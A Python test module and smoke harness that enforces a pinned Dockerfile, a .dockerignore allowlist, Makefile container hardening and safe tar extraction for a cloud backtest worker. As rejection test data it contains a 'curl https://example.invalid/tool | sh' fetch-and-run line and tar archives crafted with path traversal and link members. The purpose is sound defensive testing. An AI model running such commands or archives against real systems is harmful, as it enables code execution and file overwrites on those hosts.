"""Offline contracts and smoke harness for the shared Lambda/Fargate image."""

from __future__ import annotations

import argparse
import builtins
import importlib.util
import json
import math
import re
import stat
import sys
import tarfile
import tempfile
import time
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path, PurePosixPath
from typing import Never
from uuid import UUID

try:
    import pytest
except ModuleNotFoundError:  # pragma: no cover - exercised by the production image harness.
    pytest = None  # type: ignore[assignment]

from src.cloud import worker as worker_module
from src.cloud.contracts import (
    REQUIRED_ARTIFACTS,
    ChecksumsManifest,
    DatasetRef,
    ResearchRequest,
    RunRecord,
    RunSpec,
    RunStatus,
    canonical_json_bytes,
    sha256_hex,
)
from src.cloud.prepare_handler import _run_spec_payload
from src.cloud.worker import execute_run

try:
    from tests.cloud.fakes import FakeObjectStore, FakeRunRepository
except ModuleNotFoundError:  # pragma: no cover - used by the mounted image harness.

    @dataclass(frozen=True, slots=True)
    class _PutCall:
        key: str
        body: bytes
        content_type: str

    class FakeObjectStore:
        """Minimal local fake bundled with the mounted smoke harness."""

        def __init__(self) -> None:
            self._objects: dict[str, bytes] = {}
            self._put_calls: list[_PutCall] = []

        @property
        def put_calls(self) -> tuple[_PutCall, ...]:
            return tuple(self._put_calls)

        def put(self, key: str, body: bytes, content_type: str) -> None:
            copied = bytes(body)
            existing = self._objects.get(key)
            if existing is not None and existing != copied:
                raise AssertionError("immutable smoke object collision")
            self._objects.setdefault(key, copied)
            self._put_calls.append(_PutCall(key, copied, content_type))

        def get(self, key: str, maximum_bytes: int) -> bytes:
            body = self._objects[key]
            if len(body) > maximum_bytes:
                raise AssertionError("smoke object exceeds its bounded read")
            return bytes(body)

    class FakeRunRepository:
        """The small injected state seam needed by the one-shot worker."""

        def __init__(self) -> None:
            self._record: RunRecord | None = None

        def create_pending(self, record: RunRecord) -> None:
            if self._record is not None or record.status is not RunStatus.PENDING:
                raise AssertionError("invalid smoke PENDING record")
            self._record = record

        def mark_running(self, run_id: str, started_at: datetime) -> None:
            if self._record is None or self._record.run_id != run_id:
                raise AssertionError("unknown smoke run")
            if self._record.status is not RunStatus.PENDING:
                raise AssertionError("smoke run is not pending")
            self._record = self._record.model_copy(
                update={"status": RunStatus.RUNNING, "started_at": started_at}
            )


_HARNESS_PATH = Path(__file__).resolve()
_ROOT = _HARNESS_PATH.parents[2] if len(_HARNESS_PATH.parents) > 2 else Path("/app")
_DOCKERFILE = _ROOT / "Dockerfile"
_DOCKERIGNORE = _ROOT / ".dockerignore"
_MAKEFILE = _ROOT / "Makefile"
_FIXTURE = Path(__file__).with_name("fixtures") / "spy-daily.parquet"
_RUN_ID = "123e4567-e89b-12d3-a456-426614174000"
_PUBLICATION_SEQUENCE = (
    "run-spec.json",
    "result.json",
    "trades.parquet",
    "equity-curve.parquet",
    "report.html",
    "checksums.json",
)
_FROM_PATTERN = re.compile(
    r"^(?P<image>[a-z0-9./_-]+):(?P<tag>[^@\s]+)@sha256:(?P<digest>[0-9a-f]{64})"
    r"\s+AS\s+(?P<stage>[a-z][a-z0-9_-]*)$"
)
_ARCHIVE_FILE_MAXIMUMS = {
    "run-spec.json": 64 * 1024,
    "result.json": 64 * 1024,
    "trades.parquet": 16 * 1024 * 1024,
    "equity-curve.parquet": 32 * 1024 * 1024,
    "report.html": 8 * 1024 * 1024,
    "checksums.json": 64 * 1024,
}


@dataclass(frozen=True, slots=True)
class _DockerInstruction:
    keyword: str
    arguments: str


def _read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def _docker_parser_directives(path: Path) -> tuple[tuple[str, str], ...]:
    """Inspect BuildKit directives before ordinary comments or Docker instructions."""
    directives: list[tuple[str, str]] = []
    for raw_line in _read(path).splitlines():
        stripped = raw_line.strip()
        if not stripped:
            continue
        if not stripped.startswith("#"):
            break
        directive = stripped[1:].strip()
        key, separator, value = directive.partition("=")
        if separator and key.strip().lower() in {"syntax", "escape", "check"}:
            directives.append((key.strip().lower(), value.strip()))
    return tuple(directives)


def _docker_instructions(path: Path) -> tuple[_DockerInstruction, ...]:
    """Parse active logical Dockerfile instructions, retaining continuations."""
    logical_lines: list[str] = []
    pending = ""
    for raw_line in _read(path).splitlines():
        stripped = raw_line.strip()
        if not pending and (not stripped or stripped.startswith("#")):
            continue
        if stripped.endswith("\\"):
            pending += f"{stripped[:-1].rstrip()} "
            continue
        logical_lines.append(f"{pending}{stripped}")
        pending = ""
    assert not pending, "Dockerfile has an unterminated continuation"
    return tuple(
        _DockerInstruction(keyword.upper(), arguments.strip())
        for line in logical_lines
        for keyword, _, arguments in (line.partition(" "),)
        if keyword
    )


def _dockerignore_rules(path: Path) -> tuple[str, ...]:
    return tuple(
        line.strip()
        for line in _read(path).splitlines()
        if line.strip() and not line.lstrip().startswith("#")
    )


def _assert_dockerfile_contract(path: Path) -> None:
    """Require the complete active Dockerfile allowlist and no parser frontends."""
    assert _docker_parser_directives(path) == (), "Dockerfile parser directives are forbidden"
    instructions = _docker_instructions(path)
    expected = (
        (
            "FROM",
            "ghcr.io/astral-sh/uv:0.6.14@sha256:"
            "3362a526af7eca2fcd8604e6a07e873fb6e4286d8837cb753503558ce1213664 AS uv",
        ),
        (
            "FROM",
            "python:3.12.11-slim-bookworm@sha256:"
            "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS build",
        ),
        ("COPY", "--from=uv /uv /uvx /bin/"),
        ("ENV", "UV_PROJECT_ENVIRONMENT=/opt/venv UV_LINK_MODE=copy"),
        ("WORKDIR", "/build"),
        ("COPY", "pyproject.toml uv.lock ./"),
        ("RUN", "uv sync --frozen --no-dev --extra cloud --no-install-project"),
        (
            "FROM",
            "python:3.12.11-slim-bookworm@sha256:"
            "519591d6871b7bc437060736b9f7456b8731f1499a57e22e6c285135ae657bf7 AS runtime",
        ),
        (
            "ENV",
            'PATH="/opt/venv/bin:$PATH" PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1 HOME=/tmp',
        ),
        (
            "RUN",
            "groupadd --gid 10001 app && useradd --uid 10001 --gid 10001 --no-create-home app "
            "&& mkdir -p /app /tmp /harness/fixtures && chmod 1777 /tmp",
        ),
        ("COPY", "--from=build /opt/venv /opt/venv"),
        ("COPY", "src /app/src"),
        ("RUN", "chown -R root:root /app/src /opt/venv && chmod -R a-w /app/src /opt/venv"),
        ("WORKDIR", "/app"),
        ("USER", "10001:10001"),
        ("ENTRYPOINT", '["/opt/venv/bin/python", "-m", "awslambdaric"]'),
        ("CMD", '["src.cloud.results_handler.lambda_handler"]'),
    )
    assert tuple((item.keyword, item.arguments) for item in instructions) == expected, (
        "Dockerfile active instruction sequence changed"
    )
    stages = tuple(instruction for instruction in instructions if instruction.keyword == "FROM")
    assert all(_FROM_PATTERN.fullmatch(stage.arguments) is not None for stage in stages)
    assert all(instruction.keyword not in {"ADD", "EXPOSE"} for instruction in instructions)


def test_active_dockerfile_enforces_the_exact_pinned_runtime_contract() -> None:
    """Catches comments or extra active instructions that weaken the runtime image."""
    _assert_dockerfile_contract(_DOCKERFILE)


def test_dockerfile_contract_rejects_a_mutable_buildkit_syntax_frontend(tmp_path: Path) -> None:
    """Catches a parser directive that would fetch a mutable external build frontend."""
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text("# syntax=docker/dockerfile:latest\n" + _read(_DOCKERFILE))

    with pytest.raises(AssertionError, match="parser directives"):
        _assert_dockerfile_contract(dockerfile)


def test_dockerfile_contract_rejects_remote_add_and_extra_build_tooling(tmp_path: Path) -> None:
    """Catches active build-stage supply-chain additions outside the exact allowlist."""
    remote_add = tmp_path / "Dockerfile.remote-add"
    remote_add.write_text(
        _read(_DOCKERFILE).replace(
            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
            "ADD https://example.invalid/tool /opt/venv/bin/tool\n"
            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
        )
    )
    extra_run = tmp_path / "Dockerfile.extra-run"
    extra_run.write_text(
        _read(_DOCKERFILE).replace(
            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project",
            "RUN uv sync --frozen --no-dev --extra cloud --no-install-project\n"
            "RUN curl https://example.invalid/tool | sh",
        )
    )

    with pytest.raises(AssertionError, match="active instruction sequence"):
        _assert_dockerfile_contract(remote_add)
    with pytest.raises(AssertionError, match="active instruction sequence"):
        _assert_dockerfile_contract(extra_run)


def test_dockerignore_is_an_ordered_allowlist_that_never_reopens_sensitive_inputs() -> None:
    """Catches a later negation that reintroduces secrets after the narrow allowlist."""
    rules = _dockerignore_rules(_DOCKERIGNORE)
    allowlist = (
        "**",
        "!Dockerfile",
        "!.dockerignore",
        "!pyproject.toml",
        "!uv.lock",
        "!src/",
        "!src/**",
    )
    assert rules[: len(allowlist)] == allowlist
    assert all(not rule.startswith("!") for rule in rules[len(allowlist) :])
    assert {
        ".git",
        ".codegraph",
        ".env",
        ".env.*",
        "**/.env",
        "**/.env.*",
        ".aws",
        "credentials",
        "*.pem",
        "*.key",
        "tests",
        ".terraform",
        "*.tfstate",
        "*.tfplan",
        ".venv",
        "__pycache__",
        ".pytest_cache",
        ".coverage",
        "htmlcov",
        "artifacts",
        "data",
    } <= set(rules[len(allowlist) :])


def test_make_cloud_targets_are_frozen_and_container_smoke_enforces_runtime_policy() -> None:
    """Catches a non-reproducible target or a container smoke without security controls."""
    makefile = _read(_MAKEFILE)

    assert "cloud-test:" in makefile
    assert "cloud-smoke:" in makefile
    assert "cloud-verify:" in makefile
    assert "cloud-container-smoke:" in makefile
    assert (
        "uv run --frozen --extra dev --extra cloud pytest tests/cloud/test_packaging.py -q"
        in makefile
    )
    assert (
        "uv run --frozen --extra dev --extra cloud python tests/cloud/test_packaging.py --smoke"
        in makefile
    )
    assert (
        "docker build --platform linux/amd64 --iidfile \"$$image_iidfile\" -t $(CLOUD_IMAGE) ."
        in makefile
    )
    assert "--iidfile \"$$image_iidfile\"" in makefile
    assert "$(CLOUD_IMAGE) /harness/test_packaging.py" not in makefile
    assert "\"$$image_id\" /harness/test_packaging.py" in makefile
    assert "--network none" in makefile
    assert "--ipc=none" in makefile
    assert "--read-only" in makefile
    assert "--user 10001:10001" in makefile
    assert "--tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m" in makefile
    assert "-e PYTHONPATH=/harness:/app" in makefile
    assert "readonly" in makefile
    assert "--container-smoke" in makefile
    assert "--verify-container-artifacts" in makefile
    assert "--extract-container-archive" in makefile
    assert "docker exec" in makefile
    assert "tarfile.open" in makefile
    assert "tar -C" not in makefile
    assert "AWS_ACCESS_KEY_ID" not in makefile
    assert "AWS_SECRET_ACCESS_KEY" not in makefile


def test_mounted_harness_imports_without_the_dev_test_runner(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Catches a production image smoke harness that leaks a dev-only pytest dependency."""
    real_import = builtins.__import__

    def reject_pytest(name: str, *args: object, **kwargs: object) -> object:
        if name == "pytest":
            raise ModuleNotFoundError("pytest is intentionally absent from the runtime image")
        return real_import(name, *args, **kwargs)

    module_name = "_image_smoke_harness"
    spec = importlib.util.spec_from_file_location(module_name, Path(__file__))
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    with monkeypatch.context() as context:
        context.setitem(sys.modules, module_name, module)
        context.setattr(builtins, "__import__", reject_pytest)
        spec.loader.exec_module(module)
    assert module._main is not None


def _run_spec(store: FakeObjectStore) -> RunSpec:
    fixture = _FIXTURE.read_bytes()
    dataset = DatasetRef(
        bucket="offline-artifacts",
        key="datasets/v1/offline-fixture/spy-daily.parquet",
        sha256=sha256_hex(fixture),
        manifest_key="datasets/v1/offline-fixture/manifest.json",
        manifest_sha256="a" * 64,
        symbol="SPY",
        calendar="XNYS",
        interval="1d",
        start="2024-01-02",
        end="2024-04-02",
        acquisition_id="offline-fixture",
        completed_at=datetime(2024, 4, 2, tzinfo=UTC),
    )
    request = ResearchRequest.model_validate(
        {
            "symbol": "SPY",
            "start": "2024-01-02",
            "end": "2024-04-02",
            "strategy_key": "ma_crossover",
            "strategy_parameters": {"fast_period": 3, "slow_period": 10},
        }
    )
    run_spec = RunSpec.create(
        request=request,
        dataset=dataset,
        image_digest="sha256:" + "b" * 64,
        now=datetime(2024, 4, 3, tzinfo=UTC),
        run_id=UUID(_RUN_ID),
    )
    store.put(dataset.key, fixture, "application/vnd.apache.parquet")
    store.put(
        run_spec.run_spec_key,
        canonical_json_bytes(_run_spec_payload(run_spec)),
        "application/json",
    )
    return run_spec


def _validate_artifact_bodies(bodies: dict[str, bytes]) -> dict[str, tuple[int, str]]:
    """Verify the exact finalizer-facing artifact set without filtering expected names first."""
    assert set(bodies) == set(_PUBLICATION_SEQUENCE)
    manifest = ChecksumsManifest.model_validate_json(bodies["checksums.json"])
    declared = {artifact.name: artifact for artifact in manifest.artifacts}
    assert set(declared) == REQUIRED_ARTIFACTS
    assert len(declared) == len(manifest.artifacts) == len(REQUIRED_ARTIFACTS)
    assert "checksums.json" not in declared
    for name, digest in declared.items():
        body = bodies[name]
        assert digest.byte_length == len(body)
        assert digest.sha256 == sha256_hex(body)
    return {name: (len(body), sha256_hex(body)) for name, body in sorted(bodies.items())}


def _published_artifact_bodies(store: FakeObjectStore, run_spec: RunSpec) -> dict[str, bytes]:
    """Read exactly what the worker actually published, including ordering and no extras."""
    calls = store.put_calls
    expected_keys = (
        run_spec.dataset.key,
        *(f"{run_spec.result_prefix}{name}" for name in _PUBLICATION_SEQUENCE),
    )
    assert tuple(call.key for call in calls) == expected_keys
    assert (
        tuple(call.key.removeprefix(run_spec.result_prefix) for call in calls[1:])
        == _PUBLICATION_SEQUENCE
    )
    return {
        name: store.get(f"{run_spec.result_prefix}{name}", 32 * 1024 * 1024)
        for name in _PUBLICATION_SEQUENCE
    }


def _run_offline_smoke(output_directory: Path) -> dict[str, tuple[int, str]]:
    """Run the real worker and copy its validated publication set to a fresh directory."""
    output_directory.mkdir(parents=True, exist_ok=False)
    store = FakeObjectStore()
    repository = FakeRunRepository()
    run_spec = _run_spec(store)
    repository.create_pending(
        RunRecord(
            run_id=run_spec.run_id,
            status=RunStatus.PENDING,
            visibility=run_spec.request.visibility,
            dataset_key=run_spec.dataset.key,
            dataset_sha256=run_spec.dataset.sha256,
            run_spec_key=run_spec.run_spec_key,
            result_prefix=run_spec.result_prefix,
            image_digest=run_spec.image_digest,
            created_at=run_spec.created_at,
            expires_at=1_800_000_000,
        )
    )
    execute_run(
        run_spec.run_spec_key,
        object_store=store,
        run_repository=repository,
        clock=lambda: datetime(2024, 4, 3, 12, tzinfo=UTC),
    )
    bodies = _published_artifact_bodies(store, run_spec)
    inventory = _validate_artifact_bodies(bodies)
    for name, body in bodies.items():
        (output_directory / name).write_bytes(body)
    return inventory


def _verify_copied_artifacts(artifact_directory: Path) -> dict[str, tuple[int, str]]:
    """Independently verify the unfiltered container receipt copied to the host."""
    directory_mode = artifact_directory.lstat().st_mode
    assert stat.S_ISDIR(directory_mode) and not artifact_directory.is_symlink()
    paths = tuple(artifact_directory.iterdir())
    assert all(stat.S_ISREG(path.lstat().st_mode) and not path.is_symlink() for path in paths)
    return _validate_artifact_bodies({path.name: path.read_bytes() for path in paths})


def _extract_container_archive(
    archive_path: Path, output_directory: Path
) -> dict[str, tuple[int, str]]:
    """Validate a container artifact tar stream before copying regular members to the host."""
    expected_member_names = (
        "artifacts",
        *(f"artifacts/{name}" for name in _PUBLICATION_SEQUENCE),
    )
    with tarfile.open(archive_path, "r:*") as archive:
        members = tuple(archive.getmembers())
        names = tuple(member.name for member in members)
        assert len(names) == len(set(names)), "archive contains duplicate member names"
        for member in members:
            member_path = PurePosixPath(member.name)
            assert not member_path.is_absolute(), "archive contains an absolute member path"
            assert ".." not in member_path.parts, "archive contains a traversal member path"
        assert (
            members
            and members[0].name == "artifacts"
            and members[0].isdir()
            and not members[0].linkname
        ), "archive root must be artifacts/"
        for member in members[1:]:
            assert member.isreg(), "archive artifact members must be regular files, not links"
            assert not member.linkname, "archive artifact members must not link elsewhere"
        assert set(names[1:]) == set(expected_member_names[1:]), (
            "archive member inventory is not the exact receipt"
        )
        total_size = 0
        for member in members[1:]:
            name = PurePosixPath(member.name).name
            assert member.size <= _ARCHIVE_FILE_MAXIMUMS[name], "archive member exceeds its limit"
            total_size += member.size
        assert total_size <= sum(_ARCHIVE_FILE_MAXIMUMS.values()), "archive exceeds total limit"

        output_directory.mkdir(parents=True, exist_ok=False)
        for member in members[1:]:
            source = archive.extractfile(member)
            assert source is not None
            body = source.read(member.size + 1)
            assert len(body) == member.size, "archive member byte count changed while reading"
            destination = output_directory / PurePosixPath(member.name).name
            with destination.open("xb") as output:
                output.write(body)
    return _verify_copied_artifacts(output_directory)


def _write_malicious_archive(archive_path: Path, member: tarfile.TarInfo) -> None:
    with tarfile.open(archive_path, "w") as archive:
        directory = tarfile.TarInfo("artifacts")
        directory.type = tarfile.DIRTYPE
        archive.addfile(directory)
        archive.addfile(member)


def test_safe_archive_extractor_rejects_traversal_before_creating_output(tmp_path: Path) -> None:
    """Catches archive traversal before it can write outside the unique smoke directory."""
    archive_path = tmp_path / "traversal.tar"
    traversal = tarfile.TarInfo("artifacts/../../escape")
    traversal.size = 0
    _write_malicious_archive(archive_path, traversal)
    output_directory = tmp_path / "output"

    extractor = globals().get("_extract_container_archive")
    assert callable(extractor), "container archives require a safe stdlib extractor"
    with pytest.raises(AssertionError, match="traversal"):
        extractor(archive_path, output_directory)
    assert not output_directory.exists()


def test_safe_archive_extractor_rejects_link_members_before_creating_output(tmp_path: Path) -> None:
    """Catches symlink and hardlink archive members before they reach host verification."""
    extractor = globals().get("_extract_container_archive")
    assert callable(extractor), "container archives require a safe stdlib extractor"
    for link_type in (tarfile.SYMTYPE, tarfile.LNKTYPE):
        archive_path = tmp_path / f"link-{link_type.decode()}.tar"
        link = tarfile.TarInfo("artifacts/result.json")
        link.type = link_type
        link.linkname = "../../outside"
        _write_malicious_archive(archive_path, link)
        output_directory = tmp_path / f"output-{link_type.decode()}"

        with pytest.raises(AssertionError, match="link|regular"):
            extractor(archive_path, output_directory)
        assert not output_directory.exists()


def test_safe_archive_extractor_accepts_the_exact_receipt_in_tar_order(tmp_path: Path) -> None:
    """The tar transport may sort regular receipt files independently of publication order."""
    source_directory = tmp_path / "source"
    expected_inventory = _run_offline_smoke(source_directory)
    archive_path = tmp_path / "artifacts.tar"
    with tarfile.open(archive_path, "w") as archive:
        archive.add(source_directory, arcname="artifacts")

    assert _extract_container_archive(archive_path, tmp_path / "output") == expected_inventory


def test_safe_archive_extractor_rejects_a_wrong_directory_root_before_creating_output(
    tmp_path: Path,
) -> None:
    """The transport schema requires the canonical artifacts/ directory root."""
    source_directory = tmp_path / "source"
    _run_offline_smoke(source_directory)
    archive_path = tmp_path / "wrong-root.tar"
    with tarfile.open(archive_path, "w") as archive:
        root = tarfile.TarInfo("unexpected-root")
        root.type = tarfile.DIRTYPE
        archive.addfile(root)
        for source in sorted(source_directory.iterdir()):
            archive.add(source, arcname=f"artifacts/{source.name}")
    output_directory = tmp_path / "output"

    with pytest.raises(AssertionError, match="archive root"):
        _extract_container_archive(archive_path, output_directory)
    assert not output_directory.exists()


def _runtime_worker_path() -> str:
    path = Path(worker_module.__file__).resolve()
    assert path.is_relative_to(Path("/app/src")), f"worker imported from {path}, not /app/src"
    return str(path)


def _assert_container_filesystem_policy() -> dict[str, str]:
    """Prove runtime policy supplies the bounded writable area, not Dockerfile permissions."""
    def denied_or_absent(path: Path) -> str:
        try:
            path.touch(exist_ok=False)
        except FileNotFoundError:
            return "absent"
        except OSError:
            return "denied"
        else:
            path.unlink()
            raise AssertionError(f"{path.parent} is writable outside the bounded /tmp tmpfs")

    var_tmp = denied_or_absent(Path("/var/tmp/.write-probe"))
    dev_shm = denied_or_absent(Path("/dev/shm/.write-probe"))
    Path("/tmp/.write-probe").touch()
    return {"dev_shm_write": dev_shm, "tmp_write": "succeeded", "var_tmp_write": var_tmp}


def test_offline_worker_smoke_writes_exact_artifact_set(tmp_path: Path) -> None:
    """Catches a successful worker run that lacks a complete verified output contract."""
    artifact_directory = tmp_path / "worker-output"
    inventory = _run_offline_smoke(artifact_directory)

    assert tuple(inventory) == tuple(sorted(_PUBLICATION_SEQUENCE))
    assert all(size > 0 and len(digest) == 64 for size, digest in inventory.values())
    result = json.loads((artifact_directory / "result.json").read_text(encoding="utf-8"))
    assert result["run_id"] == _RUN_ID
    assert all(value is None or math.isfinite(value) for value in result["metrics"].values())
    assert _verify_copied_artifacts(artifact_directory) == inventory


def test_offline_worker_smoke_rejects_an_extra_published_result_object(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Catches a harness that selects six expected files while ignoring worker extras."""
    real_execute_run = execute_run

    def publish_extra(*args: object, **kwargs: object) -> None:
        real_execute_run(*args, **kwargs)
        store = kwargs["object_store"]
        assert isinstance(store, FakeObjectStore)
        store.put(f"runs/v1/{_RUN_ID}/debug.json", b"{}", "application/json")

    monkeypatch.setattr("tests.cloud.test_packaging.execute_run", publish_extra)
    with pytest.raises(AssertionError):
        _run_offline_smoke(tmp_path / "worker-output")


def test_offline_worker_smoke_rejects_a_tampered_checksums_manifest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Catches a smoke verifier that never parses the finalizer-facing manifest."""
    real_execute_run = execute_run

    def tamper_manifest(*args: object, **kwargs: object) -> None:
        real_execute_run(*args, **kwargs)
        store = kwargs["object_store"]
        assert isinstance(store, FakeObjectStore)
        store._objects[f"runs/v1/{_RUN_ID}/checksums.json"] = b"{}"

    monkeypatch.setattr("tests.cloud.test_packaging.execute_run", tamper_manifest)
    with pytest.raises(Exception):
        _run_offline_smoke(tmp_path / "worker-output")


def _main() -> Never:
    parser = argparse.ArgumentParser(description="Run the offline cloud worker packaging smoke.")
    parser.add_argument(
        "--smoke", action="store_true", help="run the local object-store worker harness"
    )
    parser.add_argument(
        "--container-smoke", action="store_true", help="hold validated /tmp artifacts for docker cp"
    )
    parser.add_argument("--output-directory", type=Path)
    parser.add_argument("--verify-container-artifacts", type=Path)
    parser.add_argument("--extract-container-archive", type=Path)
    arguments = parser.parse_args()
    if arguments.extract_container_archive is not None:
        if arguments.output_directory is None:
            parser.error("--extract-container-archive requires --output-directory")
        print(
            json.dumps(
                _extract_container_archive(
                    arguments.extract_container_archive, arguments.output_directory
                ),
                sort_keys=True,
            )
        )
        raise SystemExit(0)
    if arguments.verify_container_artifacts is not None:
        print(
            json.dumps(
                _verify_copied_artifacts(arguments.verify_container_artifacts), sort_keys=True
            )
        )
        raise SystemExit(0)
    if arguments.smoke == arguments.container_smoke:
        parser.error("choose exactly one of --smoke or --container-smoke")
    if arguments.container_smoke:
        if arguments.output_directory is None:
            parser.error("--container-smoke requires --output-directory")
        inventory = _run_offline_smoke(arguments.output_directory)
        print(
            json.dumps(
                {
                    "artifact_inventory": inventory,
                    "filesystem": _assert_container_filesystem_policy(),
                    "ready_for_copy": True,
                    "worker_path": _runtime_worker_path(),
                },
                sort_keys=True,
            )
        )
        release = Path("/tmp/release")
        while not release.exists():
            time.sleep(0.1)
    elif arguments.output_directory is None:
        with tempfile.TemporaryDirectory(prefix="algo-cloud-smoke-") as temporary:
            print(json.dumps(_run_offline_smoke(Path(temporary) / "artifacts"), sort_keys=True))
    else:
        print(json.dumps(_run_offline_smoke(arguments.output_directory), sort_keys=True))
    raise SystemExit(0)


if __name__ == "__main__":
    _main()
